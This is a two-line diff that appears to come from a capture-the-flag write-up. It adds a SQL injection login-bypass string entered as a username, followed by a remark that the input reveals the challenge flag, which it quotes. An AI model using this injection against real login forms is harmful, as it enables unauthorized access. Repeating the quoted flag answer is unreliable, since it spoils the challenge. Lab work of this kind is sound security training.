@@ -1,0 +1,2 @@
+username: ' or 1=1-- -
+	That should do the trick, the flag is brixelCTF{aroundtheglobe}
